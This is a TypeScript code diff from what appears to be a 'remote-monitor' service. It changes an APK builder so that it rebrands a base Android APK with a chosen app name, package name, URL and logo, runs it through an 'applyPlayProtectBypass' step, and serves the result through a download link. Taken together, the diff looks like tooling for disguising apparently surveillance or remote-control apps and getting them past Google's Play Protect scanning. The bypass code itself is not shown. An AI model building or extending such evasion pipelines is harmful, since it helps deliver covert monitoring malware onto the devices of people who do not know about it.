@@ -158,6 +158,11 @@ export async function buildMemoryAPK(options: APKMemoryOptions) {
       ? '/app/public/apks'
       : '/home/ubuntu/remote-monitor/public/apks';
     
+    // Ensure output directory exists
+    if (!fs.existsSync(apksDir)) {
+      fs.mkdirSync(apksDir, { recursive: true });
+    }
+    
     // Find the largest APK file (>1MB)
     const files = fs.readdirSync(apksDir);
     const apkFiles = files
@@ -179,9 +184,48 @@ export async function buildMemoryAPK(options: APKMemoryOptions) {
       };
     }
     
+    const baseAPK = apkFiles[0].path;
     const timestamp = Date.now();
-    const filename = `${options.appName}-${timestamp}.apk`;
-    const downloadUrl = `${process.env.VITE_APP_URL || 'https://remotemon-vhmaxpe6.manus.space'}/apks/${filename}`;
+    const randomSuffix = Math.random().toString(36).substring(2, 8);
+    const sanitizedName = options.appName
+      .replace(/[^a-zA-Z0-9-]/g, '-')
+      .replace(/-+/g, '-')
+      .toLowerCase();
+    const filename = `${sanitizedName}-${timestamp}-${randomSuffix}.apk`;
+    const outputPath = path.join(apksDir, filename);
+    
+    console.log('[BUILD-APK] Building APK:', { baseAPK, outputPath, appName: options.appName });
+    
+    // Apply Play Protect bypass and save to disk
+    const bypassResult = await applyPlayProtectBypass(
+      baseAPK,
+      {
+        appName: options.appName,
+        packageName: `com.${options.appName.toLowerCase().replace(/[^a-z0-9]/g, '')}`,
+        appUrl: options.appUrl,
+        logoUrl: options.logoUrl,
+      },
+      outputPath
+    );
+    
+    if (!bypassResult.success) {
+      console.warn('[BUILD-APK] Bypass failed, copying base APK instead');
+      fs.copyFileSync(baseAPK, outputPath);
+    }
+    
+    // Verify file was created
+    if (!fs.existsSync(outputPath)) {
+      return {
+        success: false,
+        error: 'Failed to create APK file',
+        downloadUrl: undefined,
+        filename: undefined,
+      };
+    }
+    
+    const downloadUrl = `${process.env.VITE_APP_URL || 'https://remotemon-vhmaxpe6.manus.space'}/get-apk/${filename}`;
+    
+    console.log('[BUILD-APK] APK built successfully:', { filename, downloadUrl });
     
     return {
       success: true,
@@ -190,6 +234,7 @@ export async function buildMemoryAPK(options: APKMemoryOptions) {
       error: undefined,
     };
   } catch (error) {
+    console.error('[BUILD-APK] Error:', error);
     return {
       success: false,
       error: error instanceof Error ? error.message : 'Unknown error',
